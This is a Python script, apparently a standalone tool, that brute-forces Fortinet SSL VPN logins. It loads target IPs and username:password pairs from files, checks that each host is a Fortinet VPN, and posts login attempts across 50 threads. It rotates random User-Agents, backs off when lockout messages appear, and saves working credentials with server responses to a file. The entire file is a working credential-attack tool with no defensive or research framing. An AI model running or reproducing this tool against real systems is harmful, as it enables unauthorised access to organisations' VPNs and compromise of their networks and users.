import logging
import queue
import random
import sys
import time
import threading
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from fake_useragent import UserAgent
from colorama import init, Fore
import requests
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Initialize logging and colorama
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
init(autoreset=True)

class FortiBrute:
    def __init__(self):
        self.domain = ''
        self.ip_list = self.load_ips('ips.txt')
        self.pass_list = list(self.load_user_pass_combos('creds.txt'))
        self.out_file = 'logins.txt'
        self.error_file = 'errors.log'
        self.max_threads = 50
        self.timeout = 10
        self.max_failures = 3
        self.min_sleep = 1
        self.max_sleep = 5
        self.ua = UserAgent()
        self.success_count = 0
        self.failure_count = 0
        self.total_attempts = 0
        self.results_queue = queue.Queue()
        self.logger = logging.getLogger(__name__)
        self.lock = threading.Lock()  # Lock for thread safety
        self.ensure_out_file_exists()

    def ensure_out_file_exists(self):
        """Ensure the output file exists."""
        if not os.path.exists(self.out_file):
            with open(self.out_file, 'w') as f:
                pass

    def load_ips(self, ip_file):
        """Load IP addresses from a file."""
        try:
            with open(ip_file, 'r') as file:
                ip_list = []
                for line in file:
                    line = line.strip()
                    if ':' in line:
                        ip, port = line.split(':')
                        ip_list.append((ip.strip(), port.strip()))
                    else:
                        ip_list.append((line.strip(), '10443'))
                return ip_list
        except FileNotFoundError:
            print(Fore.RED + f"Error: IP file '{ip_file}' not found.")
            return []

    def load_user_pass_combos(self, pass_file):
        """Load username and password combinations from a file."""
        try:
            with open(pass_file, 'r') as file:
                for line in file:
                    line = line.strip()
                    if line:
                        yield tuple(line.split(':'))
        except FileNotFoundError:
            print(Fore.RED + f"Error: Password file '{pass_file}' not found.")
            yield from []

    def create_session(self):
        """Create a session to maintain cookies across requests."""
        session = requests.Session()
        session.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
        })
        return session

    def logout(self, session, url):
        """Log out from the session."""
        try:
            logout_url = f"{url}/remote/logout"
            response = session.get(logout_url, timeout=self.timeout, verify=False)
            if response.status_code == 200:
                self.logger.info(f"Logged out from {url} successfully.")
            else:
                self.logger.warning(f"Logout failed for {url}. Status code: {response.status_code}")
        except RequestException as e:
            self.logger.warning(f"Logout request failed for {url}: {e}")
        finally:
            session.close()

    def rep_success(self, ip, user, pwd, proof):
        """Log and report a successful login attempt."""
        success_msg = f"SUCCESS - IP: {ip}, User: {user}, Password: {pwd}, Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}"
        print(Fore.GREEN + success_msg)

        self.results_queue.put_nowait((success_msg, proof))
        with self.lock:
            self.success_count += 1
            self.total_attempts += 1

    def rep_error(self, ip, msg, attempts):
        """Log and report an error during an attempt."""
        error_msg = f"ERROR - IP: {ip}, Message: {msg}, Attempts: {attempts}, Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}"
        print(Fore.RED + error_msg)

        self.logger.error(error_msg)
        with self.lock:
            self.failure_count += 1
            self.total_attempts += 1

    def att_login(self, url, user, pwd, ip, attempts):
        """Attempt to log in with provided credentials."""
        data = {
            'ajax': '1',
            'username': user,
            'credential': pwd,
            'realm': self.domain if self.domain else ''
        }

        session = self.create_session()
        user_agent = self.ua.random  # Get a new User-Agent for this attempt
        session.headers.update({'User-Agent': user_agent})

        try:
            login_url = f"{url}/remote/logincheck"
            response = session.post(login_url, data=data, timeout=self.timeout, verify=False)

            if response.status_code == 200:
                if 'Too many bad login attempts' in response.text:
                    self.rep_error(ip, f"Too many attempts. Sleeping for {random.uniform(self.min_sleep, self.max_sleep)} seconds.", attempts)
                    time.sleep(random.uniform(self.min_sleep, self.max_sleep))
                    return 'too_many_attempts'
                elif 'Invalid username or password' in response.text:
                    self.logger.info(f"Invalid credentials for {ip} with user {user}.")
                    return 'invalid_credentials'
                elif 'ssl_vpn_permission_denied' in response.text.lower():
                    self.logout(session, url)
                    self.rep_error(ip, "Permission denied.", attempts)
                    return 'permission_denied'
                elif 'fortinet' in response.text.lower() and 'remote/logincheck' in response.text.lower():
                    self.logout(session, url)
                    self.rep_success(ip, user, pwd, response.text)
                    return 'success'
                else:
                    self.rep_error(ip, "Unexpected response.", attempts)
                    return 'unexpected_response'
            else:
                self.rep_error(ip, f"Unexpected status code: {response.status_code}. Attempts: {attempts}", attempts)
        except RequestException as e:
            self.rep_error(ip, f"Login error: {e}. Attempts: {attempts}", attempts)
            return 'login_error'
        finally:
            session.close()

        return 'abort'

    def proc_ip(self, ip_info):
        """Process a single IP with the given username-password combinations."""
        ip, port = ip_info
        base_url = f"https://{ip}:{port}"
        if not self.check_conn(base_url):
            self.rep_error(ip, "Connection failed.", 0)
            return

        if not self.is_forti_ssl_vpn(base_url):
            self.rep_error(ip, "Not a Fortinet SSL VPN.", 0)
            return

        attempts = 0
        for user, pwd in self.pass_list:
            if attempts >= self.max_failures:
                self.rep_error(ip, "Exceeded maximum failures.", attempts)
                break

            result = self.att_login(base_url, user, pwd, ip, attempts)
            if result == 'success':
                break
            elif result in ['abort', 'login_error', 'unexpected_response']:
                with self.lock:
                    attempts += 1

        if result != 'success':
            self.rep_error(ip, "Failed to log in after attempting all credentials.", attempts)

    def check_conn(self, url):
        """Check if the connection to the URL is valid."""
        try:
            response = requests.get(url, timeout=self.timeout, verify=False)
            return response.status_code == 200
        except RequestException:
            return False

    def is_forti_ssl_vpn(self, url):
        """Check if the target is a Fortinet SSL VPN."""
        try:
            login_url = f"{url}/remote/logincheck"
            response = requests.get(login_url, timeout=self.timeout, verify=False)
            return 'fortinet' in response.text.lower() and 'remote/logincheck' in response.text.lower()
        except RequestException:
            return False

    def run(self):
        """Main method to execute the brute force."""
        if not self.ip_list or not self.pass_list:
            print(Fore.RED + "Error: No IPs or credentials provided.")
            return

        # Start a thread to save results every 3 minutes
        save_results_thread = threading.Thread(target=self.save_res_periodically, daemon=True)
        save_results_thread.start()

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(self.proc_ip, ip_info) for ip_info in self.ip_list]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    self.logger.error(f"Error during task: {e}")

        # Save final results
        self.save_res()

        print(Fore.YELLOW + "\nSummary Report:")
        print(Fore.GREEN + f"Total Successful Logins: {self.success_count}")
        print(f"Total Attempts: {self.total_attempts}")
        print(f"Total Failed Attempts: {self.failure_count}")

    def save_res(self):
        """Save the results to the output file."""
        while not self.results_queue.empty():
            result, proof = self.results_queue.get_nowait()
            with open(self.out_file, 'a') as file:
                file.write(f"{result}\nProof: {proof}\n")

    def save_res_periodically(self):
        """Periodically save results every 3 minutes."""
        while True:
            time.sleep(180)  # 3 minutes
            self.save_res()

if __name__ == "__main__":
    brute_forcer = FortiBrute()
    brute_forcer.run()
  
